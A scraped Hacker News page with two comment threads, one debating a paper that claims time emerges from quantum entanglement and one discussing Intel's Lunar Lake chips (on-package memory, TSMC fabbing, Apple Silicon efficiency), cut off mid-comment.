the universe is a hologram, even when there aren't any tests we can do to prove that the universe can only be a hologram because only holograms behave in such and such a way. But when I think about it, this seems like a massive leap. We can hypothetically come up with isomorphisms that map, say, the four fundamental forces to like, four angels that work behind the scenes to orchestrate all the interactions in the universe. But that doesn't mean there really are four angels doing this. I suppose this is what someone means when they say we've \"confused the map for the territory.\" I can't read the text of the paper referenced by the article because I don't have a subscription, but the abstract says: > We present an implementation of a recently proposed procedure for defining time, based on the description of the evolving system and its clock as noninteracting, entangled systems, according to the Page and Wootters approach. We study how the quantum dynamics transforms into a classical-like behavior when conditions related to macroscopicity are met by the clock alone, or by both the clock and the evolving system. In the description of this emerging behavior finds its place the classical notion of time, as well as that of phase-space and trajectories on it. This allows us to analyze and discuss the relations that must hold between quantities that characterize the system and clock separately, in order for the resulting overall picture to be that of a physical dynamics as we mean it. Sounds to me like \"we found an isomorphism between systems with internal time and systems without time that are entangled with external time...\" and I just don't care, because I can come up with any isomorphism I want to. Without a prediction that contradicts our current theories, it's meaningless. A lot of headlines in theoretical physics strike me as displaying this behavior. Listening to Sabine makes me think that this is the totality of string theory as well. Am I the crazy one? reply entropicdrifter 2 hours agoparentNo, you're not crazy. A ton of theoretical physics in the past several decades has gone into wild speculation about things we're able to mathematically justify and therefore imagine logically. That doesn't inherently mean it's the only possibility, just that it is one that fits what we know about the math right now. reply vintermann 20 hours agoprevWhen they built up this physical theory, they assumed things about time, like that one thing happens after another, countless -- well -- countless times. There is no way to not do that. So it's pointless to say \"time is an illusion\". It's a basic category of thought. But whatever to get hype for your paper, I guess... reply coldtea 16 hours agoparentThat's a facile dismissal if I ever saw one. You can \"assume things about time\" while writing a paper (including when it's due for sunmission), while still investigating whether the object of those assumptions has some fundamental properties, or whether it is just an emergent phenomenon from more fundamental things with no specific substance to it. Same way we can assume things about color, but still come to the conclusion that the qualia of color are just manufactured in our brain, and that the reality behind color, as far as the universe is concerned, is electromagnetic radiation at various frequences. reply pdonis 3 hours agorootparent> That's a facile dismissal Not really. The paper referenced in this article basically says \"time\" for a quantum system emerges from entanglement between that system and a clock. What is a clock? A system that, um, keeps time. Circular reasoning. reply coldtea 2 hours agorootparent>What is a clock? A system that, um, keeps time In colloquial use, a clock is just a set of rotating gears with some spring - or some other such contraption - from sun dials to hourglasses and quartz. It might be used for measuring time, but it's existance as a device is not based self-referentially to the concept of time anymore than a drinking glass is based on the concept of liquids to exists. What's more, in this case the \"clock\" is just an example of an oscillator. reply nico 15 hours agoparentprev> So it's pointless to say \"time is an illusion\". It's a basic category of thought If you think it’s pointless, it’s going to be pointless to you whether it’s true or not However, to give an alternative point of view. If you can model time differently and provide some predictions or enable some technology, then having a different understanding of time might be very useful. Even if we still need to use time in the models And that’s been the case with general relativity. For a long time, and for many physical phenomena, Newton laws and models are just fine. But relativity has enabled a lot of better technologies and finer understanding of some things, through re-defining how we model time reply blueprint 16 hours agoparentprevok but what does it mean for anything to \"happen\"? reply kfrzcode 15 hours agorootparentI highly recommend listening to Alan Watts speak on this topic; his lecture \"We as Organism\" is quite compelling, if non-scientific https://www.youtube.com/watch?v=KpMGbjvBXSE reply lodovic 12 hours agorootparentHaving to listen to a 53 minute monologue is too much, especially with the expectation that I won't agree as the podcast is subjective and non-scientific. Could you perhaps provide at least a recap when referring to someone else? reply kfrzcode 12 hours agorootparentHonestly, I could not. But I can refer you to a perplexity recap. I know LLM content is not allowed, so I'll quote it as a source: Alan Watts, in his lecture \"We as Organism,\" eloquently explores the interconnectedness of life and consciousness. He likens living beings to the flame of a candle, a continuous flow of energy and activity, rather than static entities. Watts argues that our consciousness often overlooks the constant, harmonious processes of life, focusing instead on potential disruptions. This myopic view leads us to identify with our ego, the troubleshooter, rather than our complete organism. He emphasizes that our bodies, like candle flames or whirlpools, are patterns of the cosmos, ever-changing yet recognizable. Watts challenges the common Western notion of life as a brief flash between two darknesses, urging us to see life as a complex, continuous dance, where there is no dancer, only the dancing. reply nico 15 hours agorootparentprevThank you. Not familiar with this lecture, but I love how eloquent Alan Watts was And it’s also great that he credits a lot of his insights to ancient Asian cultures. Essentially explaining that naturally, humans rediscover the nature of the universe, without the need for any special or modern technology, but rather through direct experience of the world reply kfrzcode 14 hours agorootparentThere are many hours of his talks that range from silly to esoteric to outright transcendent, poetry-like explorations and observations of the human condition Highly prescient as well. reply poulpy123 7 hours agoprev> illusion > noun > UK /ɪˈluː.ʒən/ US /ɪˈluː.ʒən/ > an idea or belief that is not true: > have no illusion about He had no illusions about his talents as a singer. > under no illusion I'm under no illusions (= I understand the truth) about the > man I married. > be labouring under the illusion My boss is labouring under the illusion that > > (= wrongly believes that) the project will be completed on time. > something that is not really what it seems to be: > create the illusion of A large mirror in a room can create the illusion of space. > The impression of calm in the office is just an illusion The backpain I started to have since few years tells me that time isn't an illusion reply poikroequ 14 hours agoprevMaybe I understand it wrong, but if time is not an illusion, does that mean the past still exists? Hypothetically, if we could reverse the flow of time, would that mean we could travel into the past? I ask this because I have a bit of a paradox regarding time travel. It's pretty simple, presumably we're all sentient beings, and our consciousness is here, now, in the present. The science fiction portrayal of time travel suggests that we could travel into the past and interact with our former selves. But if my conscious mind is here now in the year 2024, then what conscious mind are you talking to in the past? Surely my conscious mind cannot exist in two different eras simultaneously. This little \"paradox\" of mine has made me ponder the true nature of time. Though more likely these are just the ramblings of a person who has a poor understanding of physics. reply serf 13 hours agoparent>Surely my conscious mind cannot exist in two different eras simultaneously. mentally I think of it more like save/restore states. the future-person meeting the past person would just be past person+future person as a merged state, the past person would just be a working snapshot of everything before it without the accrued knowledge of future-person. if you're someone who believe in an untouchable intangible non-duplicable 'soul', then it breaks the framework. I see myself more as a collection of experiences, so it jibes well into that concept. reply kitd 12 hours agorootparentA more interesting idea is whether \"you\" cease to exist in the present while \"you\" travel back in time to meet \"you\" in the past. Ie, If time travel is possible, are there \"yous\" spread across every moment of your existence? That asks questions of our idea of timeless self-identity or \"soul\" if you like. Like Trigger's Broom [1], are we the same person as we were yesterday? [1] https://youtu.be/LAh8HryVaeY?si=5_URpP6si31KWIWD reply bad_username 11 hours agoparentprevThe idea of \"block universe\" follows from special relativity and suggests that not only the past \"still\" exists, but also the future \"already\" exists. In other words, all the states of the Universe from all times are physically \"there\". Here is a great i troduction to this concept: https://youtu.be/Md6DkWF2T-A reply newzisforsukas 12 hours agoparentprev> Surely my conscious mind cannot exist in two different eras simultaneously Aside from the obvious, why not? See quantum teleportation thought experiments. reply throwanem 13 hours agoparentprevIf I take a foot-long piece of string laid out straight, and coil it back on itself so its end meets its middle, which part of it stops existing? reply treebeard901 16 hours agoprevTime is a result of entropy. Which is an inherent property of everything in the universe. From when light transmits the first existence of anything to when it returns to nothing after entropy runs its course. Time is just a measurement of degradation. reply MattPalmer1086 11 hours agoparentI have never understood this, it seems backwards to me. We notice that entropy tends to increase over time, and then say that entropy is a fundamental cause of time? The increase of entropy is a statistical certainty given a causal ordering of events, no new fundamental properties required. It is certainly true that the increase of entropy gives a measurable direction to the arrow of time, i.e. the future is where entropy is higher. But I cannot fathom how entropy is anything more than a statistical effect. reply wordpad 14 hours agoparentprevwhy dose entropy (and time) have a direction, though? This is famously referred to as \"The Last Question\" by Isaac Asimov reply cpncrunch 16 hours agoprevPreviously discussed here. A New Scientist article which has more info: https://news.ycombinator.com/item?id=40550164 reply Xcelerate 16 hours agoprevThis phrase has always annoyed me. And if time isn’t an illusion, how does that come across differently than if it is? reply fsmv 14 hours agoparentIllusion is just the word they try to use to explain what emergence is. I don't think illusion really fits all that well though because illusion implies it's somehow not real and that's not what emergence is about. Emergent things are real (in the sense of Dan Dennett's real patterns) just not fundamental. reply nightowl_games 16 hours agoparentprevI agree. As a metaphysical ponderer, I often consider how \"illusion\" is fundamental to our understanding of science. Consider this: all physical laws and theories are verified through human experience on a time scale, ie: under these conditions, you will observe this result. There is always an observer and at least two points in time. Time, and observation of it, is the ground truth of all physical laws, of our very experience of the universe. reply wordpad 14 hours agorootparentYou can also prove things by deriving it mathematically, without need for any observation. Some things can even be counter intuitive like relativity and quantum physics. reply nightowl_games 4 hours agorootparentEven in your mathematical derivations, there is an implied observer and time line. Ie: \"Using these axioms, performing these operations, you will observe this result\". (Precondition, action, result) reply bbwbsb 15 hours agoparentprevA notion is an illusion when it appears to be experientially necessary but models without its structure consistently outperform models with said structure at predicting outcomes. reply coldtea 16 hours agoparentprevTo you personally in everyday life, or in general? Because they're concerned with the latter. reply TrueGeek 16 hours agoprevlunchtime doubly so reply foobar1962 16 hours agoparentThanks for saving me the trouble to post that. Somebody needed to. DA - RIP. reply bloopernova 16 hours agoparentprevThankfully, a Hoopy Frood was available this day. reply tasty_freeze 13 hours agoprevWhat if time is a a free variable that can freely move forward and backwards, perhaps doing a random walk? The people inside that spacetime (us) couldn't ever tell time changed directions or was going backwards because at any given time \"t\" the state would consistent with all prior states before t. It would also be consistent with future states of t, but the person at time t can only test for consistency with states prior to the current t, but not future states. To the person it like time is only moving forward. reply yetihehe 13 hours agoparent> What if time is a a free variable that can freely move forward and backwards, perhaps doing a random walk? It would have to have some measurable effects, distinguishable from \"consistency with states prior to the current t\". That consistency with previous states is written as t2=t1+X. If t1+X is always \"previous state plus some small change\", we simplify X to be 1. If you can invent HOW that random walk would manifest, you're up for a nobel prize. reply thehappypm 11 hours agoparentprevI’ve thought about this as well. We really only perceive time because we have memory; with no memory (like in 50 First Dates) time stands still. The only thing that breaks this is entropy. Even without memory, you can observe the universe and see how close we are to heat death at any moment. Thats an absolute age reply mlboss 14 hours agoprevAs the philosopher's say there is no past or future only present. Nothing exists outside the present. All realities(as well as memories) can only be experienced in the current moment. reply yetihehe 12 hours agoparentSome philosophers also said that everything is made from small unsplittable parts, and even called them \"atomos\", meaning unsplittable in their language. Then we found them and splitted them, an then we've done that again and now we're on our third or four level of understanding world, while those philosophers try to catch up. Don't hold your breath on any particular philosophy, they are only a questions we didn't answer yet. reply MattPalmer1086 11 hours agorootparentThe fact we jumped the gun and called the first small things we found atoms doesn't mean the philosophers were wrong... It means we were wrong to use that label for those things. We do believe there are unsplittable particles, they are just not what we called atoms. Philosophers still looking good to me. reply yetihehe 10 hours agorootparentYes, they were not wrong, like Newton was not wrong about gravity. Philosophers are still usable as a generators of novel wild ideas, which we can then check if they are real. But don't mistake \"philosopher's idea\" for reality. reply skulk 14 hours agoparentprevThere is no such thing as \"the current moment\" unless you arbitrarily choose an inertial reference frame. reply vidarh 13 hours agorootparentWe know everything but the current moment only through the fragment of memory active in the current moment, so we don't even know if any past or future has or will ever exist for us to choose. reply fizx 13 hours agorootparentprevMost people choose themselves ;) reply mr_toad 12 hours agoparentprevClearly those philosophers never studied electromagnetism. reply SillyUsername 20 hours agoprevLoving this throw away comment without any context: \"the only reason that an object appears to change over time is because it is entangled with a clock ... anyone observing the universe externally would see it as completely ... unchanging\" How is a clock unchanging? Perhaps it's needs winding, maybe somebody pulled the plug, who knows, but that's the only kind of clock I know that doesn't change. reply Pompidou 19 hours agoparentMaybe the clock with the myriads of hands rotations is view as a whole ? All the possibles states of this clock would be seen simultaneously ? But this clock is itself made up of many parts, which are in turn composed of atoms, subatomic particles, etc. The set of all possible states of the clock also includes the set of states occupied by the different parts of the clock (down to the subatomic level) over time, before and after the clock is made and then disintegrates. The clock is, in fact, just one state among many of the atoms that make it up. These atoms were scattered before being assembled into a clock, and they will be scattered again when the clock is destroyed. So, we are not really talking about a clock, but rather a set of atoms that may have occupied very different positions in the universe, and whose supposed unity exists only transiently when a human being looks at this clock. In a certain way, considering the clock as outside of time almost turns it into a non-being, or at least a diaphanous and ephemeral being, lost in a cloud of particles randomly distributed throughout the universe. reply nico 14 hours agoparentprevIt’s not talking about an unchanging clock. It’s saying that change depends on something that runs like a clock, that “ticks”, that alternates sequentially and in cycles An alternative analogy would be: imagine space and time as opposites of a spectrum. If you had just 1 moment in time, with no alternation, no change, then it would be akin to having all the space together at once, nothing moving. In the other extreme, if you had as many moments in time as possible, it would be non-stop change, in a seemingly infinite space that could never be fully explored, “unknowably large”. In a way they are saying that the universe is a sort of superposition of these extremes, and there isn’t any physical difference between them. At least in the models and experiments reply prawn 17 hours agoparentprevAnd that paragraph is just about the only meat in the article! reply memorylane 17 hours agoparentprevThis might be in reference to an idea called the block universe: https://en.m.wikipedia.org/wiki/Eternalism_(philosophy_of_ti.... reply crystaln 16 hours agoprevI’m not sure how an explanation for how time functions means that time is an illusion? reply CodeGroyper 16 hours agoparentI guess the word illusion is misused, as in a traffic jam is an illusion because it's just too many cars on too little road. I don't think illusion is meant like hallucinations. But if it is meant that way, then I guess I can't be convinced anyway, since without time I can't change my mind from not believing that to believing it. reply GenerocUsername 16 hours agoprevCosmic coincidence that time flows in the direction our brains utilize entropy to encode and retrieve information reply monkeydreams 15 hours agoparent> Cosmic coincidence that time flows in the direction our brains utilize entropy to encode and retrieve information Memory flows in the same direction as entropic growth. If time actually moved backwards according to an \"outside observer\" then they would see us remembering the future and holding the past to be unknowable. reply ElijahLynn 19 hours agoprevSource: https://journals.aps.org/pra/abstract/10.1103/PhysRevA.109.0... (paywall) reply antonvs 16 hours agoparentarXiv link: https://arxiv.org/abs/2310.13386 reply AIorNot 15 hours agorootparentSummary: The paper presents a theoretical model for understanding the concept of time in quantum mechanics. It builds upon the Page and Wootters (PaW) mechanism, a proposal that suggests time can be treated as a quantum observable. The Problem of Time in Quantum Mechanics In the standard formulation of quantum mechanics, time is not treated as an observable of a system, but rather as an external parameter. This means that time is not represented by an operator in the theory, unlike other physical quantities like position or momentum. This has been a long-standing issue in quantum mechanics, often referred to as the \"problem of time.\" The Page and Wootters (PaW) Mechanism The PaW mechanism offers a potential solution to this problem. It proposes that time can be defined operationally by using a quantum system as a clock. The idea is that the state of the clock system is entangled with the state of the system whose evolution we want to track. By measuring the state of the clock, we can infer the time for the evolving system. The Model The paper presents a specific implementation of the PaW mechanism. It considers two quantum systems: The Evolving System (Γ): This is a harmonic oscillator, a system that exhibits simple oscillatory motion. The Clock (C): This is a magnetic system, like a spin in a magnetic field. The two systems are assumed to be non-interacting but entangled. This means that their states are correlated in a way that cannot be described classically. The entanglement is crucial for the PaW mechanism to work. Quantum to Classical Transition The paper explores how the quantum description of time transitions into a classical-like behavior under certain conditions. This is done by considering the case where the clock system becomes macroscopic, meaning it behaves more like a classical object. In this limit, the quantum description of time gives way to the familiar classical notion of time as a continuous parameter. Key Findings The paper's key findings include: Operational Definition of Time: The model provides an explicit way to define time operationally using a quantum clock. Quantum to Classical Transition: The model demonstrates how the quantum description of time can transition into a classical-like behavior as the clock system becomes macroscopic. Energy Scale of the Clock: The model highlights the importance of the energy scale of the clock in its ability to accurately describe the dynamics of the evolving system. Implications This work has potential implications for our understanding of time in quantum mechanics and its connection to classical physics. It could also be relevant for areas like quantum gravity, where the nature of time is a central question. reply nico 14 hours agorootparentThank you! This is fascinating I guess if we consider ourselves, or our perception, as a quantum system, then we can be included as the clock that “drives the time” of the entangled system (the reality that we perceive) reply spacedcowboy 16 hours agoprevI have to say, it’s a pretty convincing illusion… reply revskill 13 hours agoprevTime is like anti energy to me. reply m3kw9 13 hours agoprevIs the notion and the feeling of 1 second a human made up thing? Surely the speed of time isn’t invented by us so I wonder if some other beings sense time differently reply skirmish 11 hours agoparentThat has been studied: \"A comparison of 138 species finds that dragonflies perceive changes in their environment five times faster than humans and 400 times faster than starfish.\" [1] [1] https://www.newscientist.com/article/2352665-small-and-speed... reply petre 15 hours agoprevDouglas Adams — 'Time is an illusion. Lunchtime doubly so.' Adams was right all along! reply jumploops 16 hours agoprevatime=bspace reply Khelavaster 21 hours agoprevTime has quantum oscillations as it's lowest unit of measure. This is alright. reply xyst 15 hours agoprevIf time is money, and time is an illusion. Power is also determined by money and wealth. By transitive property, money and power is also an illusion. reply TZubiri 13 hours agoprev [–] It feels as if spending too much time on Physics has some psychotic effect on the mind, not unlike psychotropic substance abuse. There's much wrong in delegating authority over the concept of time to physicists as there is wrong in delegating authority over any concept to any science that did not create it. But of the specific case of Physics dense conception of Time, there's more wrong to point out. However I can only say that the heart better understands time than the mind does. reply bubblyworld 13 hours agoparentAs someone who has tried both, I can assure you that spending too much time on physics is very unlike psychotropic substance abuse. reply asimovfan 13 hours agoparentprev [–] What authority is this? Who delegated it? Which concept did science create? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Alessandro Coppo and colleagues propose that time may be an illusion created by quantum entanglement, challenging the traditional view of time as a fundamental aspect of physical reality.",
      "The theory suggests that time appears to progress because objects are entangled with clocks, making the universe seem static to an external observer.",
      "Published in Physical Review A, this theory requires further exploration and testing to validate its claims."
    ],
    "commentSummary": [
      "A recent paper revisits the Page-Wooters mechanism, suggesting time is an illusion created by quantum entanglement, aiming to connect this concept to classical understanding and discussing metaphysical implications like free will and the nature of the universe.",
      "The study explores various perspectives on whether time is fundamental or emergent, referencing notable works and discussing entropy, causality, and the philosophical idea of \"Eternal Recurrence.\"",
      "The paper introduces a model to understand time in quantum mechanics, showing how quantum time transitions to classical time when the clock system becomes macroscopic, with implications for quantum gravity."
    ],
    "points": 141,
    "commentCount": 101,
    "retryCount": 0,
    "time": 1717449582
  },
  {
    "id": 40570356,
    "title": "AMD Unveils 192-Core EPYC \"Turin\" Processors and New Radeon Pro W7900 GPU",
    "originLink": "https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4",
    "originBody": "PIPELINE STORIES + Submit News AMD Announces Zen 5-based EPYC “Turin” Processors: Up to 192 Cores, Coming in H2’2024 AMD Slims Down Compute With Radeon Pro W7900 Dual Slot For AI Inference AMD Launching New CPUs for AM4: Ryzen 5000XT Series Coming in July TSMC's 3D Stacked SoIC Packaging Making Quick Progress, Eyeing Ultra-Dense 3μm Pitch In 2027 TSMC: Performance and Yields of 2nm on Track, Mass Production To Start In 2025 Rapidus Adds Chip Packaging Services to Plans for $32 Billion 2nm Fab MSI Teases Z790 Project Zero Plus Motherboard With CAMM2 Memory Support TSMC's Roadmap at a Glance: N3X, N2P, A16 Coming in 2025/2026 TSMC Offers a Peek at 'Global Gigafab' Process Replication Program TSMC to Expand CoWoS Capacity by 60% Yearly Through 2026 One More EPYC: AMD Launches Entry-Level Zen 4-based EPYC 4004 Series Lenovo Unveils Yoga Slim 7x 14 Gen 14 and ThinkPad T14 Gen 6 Notebooks Powered By Qualcomm Snapdragon X Elite",
    "commentLink": "https://news.ycombinator.com/item?id=40570356",
    "commentBody": "Intel Unveils Lunar Lake Architecture (anandtech.com)135 points by zdw 15 hours agohidepastfavorite130 comments tedunangst 14 hours ago> Another striking advance is the migration in the P-core database from a 'sea of fubs' to a 'sea of cells'. This process of updating the organization of the P-cores substructure moves from tiny, latch-dominated partitions to more extensive and ever larger flop-dominated partitions that are very agnostic as things go. I like to pretend I know a thing about CPU design, but I have to admit, I have no idea what's going on here. reply santiagobasulto 8 hours agoparentChip design is SUCH an advanced topic. It's potentially one of the most advanced human disciplines at the moment. I have a friend[0] that is doing his Electronics Engineering masters in Germany (very prestigious engineering university) and they're studying a freaking Pentium 4. Even for them the cutting edge chip design is black magic. [0] Ultimate frisbee teammate. reply amelius 8 hours agorootparentIs Hennessy and Patterson still the main book used in universities? reply MrsPeaches 8 hours agorootparentA list + links would be much appreciated! reply ChoGGi 5 hours agorootparentReplying for a reminder to check later. Might enjoy this video, though it's a bit basic: https://m.youtube.com/watch?v=NGFhc8R_uO4 reply p1esk 13 hours agoparentprevFUB: Functional Unit Block. It seems that they are moving from higher level (larger) building blocks to lower level (smaller) building blocks to increase efficiency. reply TeMPOraL 12 hours agorootparentThe second part of the quote says they're moving from \"tiny\" to \"more extensive\" partitions though; it feels confusingly contradictory. reply sameerds 4 hours agorootparentI read it as \"fubs were small partitions, but now with the latch boundaries dissolved between fubs, the partitions are bigger (containing flops from many fubs)\". reply fanf2 8 hours agoparentprevMy flop partition is very agnostic about understanding that sentence, as things go. reply acje 12 hours agoprevI look forward to the decline in interest in generative ML. There is a screaming need for secure online services to enable democracies to face off the threat from authoritarian regimes. To do this we need hardware that enables actors as in actor model with truly private state, not sandboxed where there is an external entity that can observe its state. Today pretty much all designs has a perverse von Neumann architecture where state is shared across different compute devices like network controllers and management engines. And the software stack is more of the same sandboxing. Apple includes a Secure Enclave on its SoC where you may only communicate with it by sending messages like a proper actor, but why aren’t servers made entirely of secure enclaves? If the memory of each enclave was private by design in hardware it shouldn’t be necessary to encrypt it. reply TeMPOraL 12 hours agoparentHow would that empower democracies more than authoritative regimes? The technologies you mention are means of control, and are used as such. Secure computing doesn't help you when the regime owns the keys (or can coerce them out of the vendor). I may very much be wrong about it, but intuition and experience tells me that means of control usually empower authoritarian parties first and foremost, unless fully owned and operated by individuals - which, in computing, is very much counter the trend and the zeitgeist. reply acje 12 hours agorootparentGood question and I don’t have a good answer. My intuition is that democracies are more dependent on transparency and that lower complexity and higher security would enable more distribution in control. reply TeMPOraL 9 hours agorootparentI intuitively agree on transparency being important for democracies, but then I see \"lower complexity\" and \"transparency\" as both being opposed to \"higher security\". Taking for example the secure enclave you mention, its whole point is to bolster security through removing transparency via a complex hardware and software system. reply Dalewyn 8 hours agorootparentYou (and probably a lot of tech nerds) need to remember democracy is a social challenge, not a technological challenge. What applies to technology does not necessarily apply to society. The more opaque and complicated you make so-called \"democracy\", the less the electorate have faith that it is fair and representative. Simplicity and transparency is security, security that democracy is working in a way everyone can and must agree with even if they don't necessarily like it. reply TeMPOraL 8 hours agorootparentI don't think it's technology vs society issue (and I do honestly maintain that social problems are supposed to be solved by technology, because that's literally what technology is for by definition). It's an issue of framing security. Cybersecurity mostly assumes the vendor is the trusted party - the users are the sheep the vendor is shepherding[0]. Security is designed to pretend first and foremost the vendor, and secondly its flock of users, against attacks from outside parties and other users. The users are untrusted parties here. Democracy, in contrast, is an unusual relationship in which it's the organization - the government - that's the untrusted party. Transparency is crucial to security of this system, because the very party that organizes it is the one most incentivized to subvert it. It's a special case where opaqueness is not accepted. This is why it's hard to port ideas from cybersecurity to democracy - the assumptions underpinning the two are opposite to each other. Most of what infosec considers good practice would immediately violate the electorate's faith you refer to. Exercise for the reader: how would our computer systems look if the security field emphasized end users as trusted, and vendors as malicious parties? -- [0] - I love how the ubiquitous analogies to good shepherds, including biblical ones, conveniently omit the fact that the very reason shepherd cares for their sheep is so they can be fleeced for wool and/or slaughtered for meat. reply baq 8 hours agorootparentprevAI slop is perfect for reducing usefulness of transparency: you can generate so much bullshit nobody will ever be able to discern what is worth looking at even if you can have access to everything. We aren't there... yet (but perhaps ask Google how is their search product doing in the past couple years). I'd love to hear what Shannon would have to say about this situation. reply chucke1992 12 hours agoparentprevI am pretty sure that democracies are happily pivot to authoritarian regimes because a lot of people just like to have a single choice they prefer. reply jjtheblunt 2 hours agorootparentor implementations of democracies can be gamed by groups with authoritarian inclinations? reply Dalewyn 11 hours agorootparentprevTo be clear: It's not that the electorates like authoritarianism, they hate \"democracy\" which doesn't listen to them nor work for their interests and benefit. reply chucke1992 10 hours agorootparentbut that's the whole point - the democracy has to consider interests of various group and - ironically - it only somehow works when you have a single unified group. When you have diverse groups - there interests do not align and it becomes a clownshow reply mahkeiro 14 hours agoprevIntel fully using TSMC for this generation is quite something! reply automatic6131 10 hours agoparentThey're making the interconnect themselves. But that very much sounds like I'm coping on their behalf. TSMC for all the logic and IO though. reply baq 8 hours agorootparentThe consumer needs Intel to get back to somewhere within reach of competitive semi manufacturing. Fingers crossed though the past decade doesn't inspire hope... reply JeremyNT 6 hours agoparentprevWhat a disaster! I hope this is the bottom, and that there's enough expertise left at Intel to save the company (and I guess enough political will in Washington to subsidize it). The world deserves competition in this space. reply DebtDeflation 8 hours agoparentprevIntel never recovered from the 10nm debacle of 2015-2020. reply wmf 2 hours agorootparentIntel 3 is supposed to be shipping as of today. reply adrian_b 12 hours agoprevBased on the instruction set extensions supported, the design of Lunar Lake has been started later that the designs of Arrow Lake and Arrow Lake S. When first announced, Lunar Lake was supposed to be manufactured by an Intel CMOS process that will be available only in 2025 (18A). At some point, Intel has decided to retarget Lunar Lake for the TSMC \"3 nm\" process, and it appears that this decision has allowed them to be ready for product launch much earlier, so it might be launched before Arrow Lake and Arrow Lake S (the latter of these 2 is a desktop CPU that will also be made in the TSMC \"3 nm\" process, according to rumors). At Hot Chips 2024, Intel is scheduled to make a more detailed presentation of Lunar Lake. reply mmaniac 9 hours agoparentAlso, apparently low end (mobile?) Arrow Lake CPUs will use 20A while higher end will use 3nm. It's not looking good for Intel foundries. reply ThePhysicist 11 hours agoprevAnyone got an estimate for when we might see new Thinkpads with these chips? End of this year? I'm not unhappy with my current gen 3 T14 but if I could have a device that's closer to my Macbook Pro M1 in performance and efficiency I'd be willing to upgrade, as I still like Linux much more than MacOS. reply aphexairlines 9 hours agoparentNot a Thinkpad and not Intel, but that already seems attainable with the asus G14 (AMD 8945HS + NVIDIA 4070) or the upcoming asus zenbook S16 (AMD HX 370). reply MaKey 10 hours agoparentprevWhy Intel instead of AMD? Just curious. reply stqism 9 hours agorootparentAttended both keynotes, but the data I’ve seen suggests Intels offerings are higher IPC + lower power VS the respective AMD AI CPUs. reply deaddodo 8 hours agorootparentIntel themselves claim 45 TOPS (IPC isn't a thing in NPUs) coming from their NPU. AMD didn't reveal the chip total of the new Ryzen series, but their NPU gets 50 TOPS. The only reason Intel's numbers are so much higher (\"120 TOPS!\") is that Intel included their chip total (what the GP dies can achieve, but at far lower power efficiency) with the NPU numbers, AMD doesn't include this. Presumably their GP cores would be able to achieve similar numbers. Given that AMDs NPUs were already ~78% more power efficient than Intel's and both are claiming ~50% power efficiency increases, I'm not sure why there would be a big upset here. Not really defending AMD here, but they have been investing hard into NPUs for about four-five generations now, while Intel only really hopped on the bandwagon last generation. Unless you just believe Intel has the best engineers in the world, period; there's no reason to believe they would close the gap that quickly. reply fariszr 10 hours agoprevA lot of the efficiency improvments depend on the new thread scheduler in Windows 11. I doubt these chips are going to be great or at least, as efficient in Linux as they are in Windows 11. AMD going for Zen5 and Zen5 is exactly to avoid this issue and the need for complex scheduling algorithms. reply eigenspace 10 hours agoparentI’m sure support for heterogeneous CPU scheduling will continue to improve on Linux too. Intel’s server chips have little cores too, and those servers are overwhelmingly running Linux, so they have a clear reason to continue to help support scheduling improvements in Linux as well. reply wmf 2 hours agorootparentServers don't have heterogeneous cores. reply diavolodeejay 13 hours agoprevTIL that ram affects wifi performance by creating interferences reply bjoli 12 hours agoparentIf you have external antennas you can (or at least could) actually try this. Having the RAM just behind the antennas (by holding them in an open case) with a clear line of sight to the router produced significantly worse results than moving the antenna 30cm in either direction. I can't remember which WiFi generation I was testing this with but I remember seeing something like a 40% reduction, worst case. reply mschuster91 10 hours agoparentprevAnything RF is deep wizarding lore, a world filled with wonders unexplainable to laypeople. The effect is well known, and the reason why if you open up your average phone, there will always be a ton of shielding around components. All the high speed buses can and do create lots of side emissions... so in order to allow a phone to function with its extremely tiny bunch of antennae in direct proximity to the chips, all components get shielded from each other. In desktops and even most laptops however, the high-speed (and thus high-frequency) chips and their clock traces are very far away from the wifi/bt antennae, so for a long time manufacturers could get away with not shielding anything, just taking care about ground planes, trace length and impedance matching and spacing. Nowadays, with buses getting ever faster and faster (to the point where analog design criteria take over priority), I think we'll start seeing shielding rather sooner than later, and we're already seeing CAMM modules getting implemented in devices for the same purpose. Side note: that's also why you're not supposed to operate a computer's parts without a case at all or with a partially open cases. The case itself acts like a faraday cage. reply mlboss 14 hours agoprev> the Lunar Lake SoC platform also includes up to 32 GB of LPDDR5X memory on the chip package itself Is this similar to Macbook M series chip with shared memory ? Will this allow intel chips to run local llms efficiently ? reply AnthonyMouse 11 hours agoparent> the Lunar Lake SoC platform also includes up to 32 GB of LPDDR5X memory on the chip package itself. This is arranged as a pair of 64-bit memory chips, offering a total 128-bit memory interface. As with other vendors using on-package memory, this change means that users can't just upgrade DRAM at-will, and the memory configurations for Lunar Lake will ultimately be determined by what SKUs Intel opts to ship. In other words, even though it's on-package, the width of the memory interface is the same as previous generations. They also exclude upgradability unnecessarily, because even with on-package memory you can still support adding memory through slots. For example, the Xeons with on-package HBM allow this. This decision by Intel seems specifically designed to screw the customer by forcing them to buy a new CPU (or computer) in order to upgrade the memory, without even providing the countervailing benefit that Apple gets from doing it that way. (Note that Apple too unnecessarily prevents adding memory at the traditional level of performance. Cache hierarchies are a thing, if you're not trying to screw the customer.) reply gjsman-1000 5 hours agorootparentWhat part of “uses up to 40% less energy” due to lower voltage requirements did you not read? reply DeepYogurt 13 hours agoparentprev> Will this allow intel chips to run local llms efficiently ? 32GB might not be enough for everything reply Dylan16807 13 hours agorootparentMicrosoft's local copilot requirements are 16GB of memory so it's plenty for that. reply dagmx 14 hours agoparentprevIn theory, that’s how Intel already is but the memory accessible to the GPU is capped at conservative values . The other issue is that traditionally the integrated GPU has been quite anaemic. reply simple_quest_9 14 hours agoprevI'm trying to learn about ISAs. And, after taking a class and watching a whole bunch of RISC vs CISC videos, I still don't know 'why' Apple Silicon is faster at a lower power consumption than Intel's chips. Can someone tell me? reply mmaniac 10 hours agoparentLots of reasons, but RISC vs CISC has little to do with it. Apple have access to the newest and best fabbing processes from TSMC. That alone can put a chip a generation ahead in terms of efficiency. Intel foundries have been struggling for years and AMD only get TSMC's scraps a few years later. Increasing clock speed is the easiest way to increase performance, but power increases quadratically with clock speed so it's very inefficient. Apple clock their processors pretty low and instead focused on increasing instructions-per-clock, which is generally more efficient but requires more die area. As an example, a lot of noise was made about the M1's 8-wide decoder, twice as wide as contemporary x86 chips, which is an important bottleneck for IPC. Increasing instructions-per-clock requires much bigger CPU cores, and the dies Apple use for their SoCs are famously enormous. While other chip manufacturers are very conscious of performance/$, Apple's vertical integration gives them wider margins and their customers are much less 